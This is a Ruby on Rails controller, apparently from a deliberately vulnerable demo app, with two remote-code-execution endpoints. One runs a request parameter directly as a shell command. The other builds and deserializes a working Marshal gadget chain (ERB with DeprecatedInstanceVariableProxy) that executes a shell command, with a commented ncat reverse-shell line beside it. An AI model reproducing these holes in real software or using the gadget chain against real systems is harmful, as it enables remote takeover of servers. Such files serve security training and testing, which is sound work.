require "base64"
require "erb"

class ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy
  def initialize(instance, method)
    @instance = instance
    @method = method
    @deprecator = ActiveSupport::Deprecation
  end
end

class RceController < ApplicationController
  def rce_simple
    puts "lets run some commands", params[:cmd]
    @cmd = params[:cmd]
    @output = `#{@cmd}`
    puts "command output", @output
  end

  # accept command or just attack
  def rce_marshal
    puts "lets play with Marshal.load ... and Base64.decode"
    @cmd = params[:cmd]
    # code = '`ncat 127.0.0.1 1234 -v -e /bin/bash 2>&1`'
    code = '`touch /tmp/pwned`'
    erb = ERB.allocate
    erb.instance_variable_set :@src, code
    erb.instance_variable_set :@filename, "1"
    erb.instance_variable_set :@lineno, 1

    ggez = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result
    @payload = Base64.encode64(Marshal.dump(ggez)).gsub("\n", "")

    Marshal.load(Base64.decode64(@payload))
    puts "you are done my friend"

  end
end
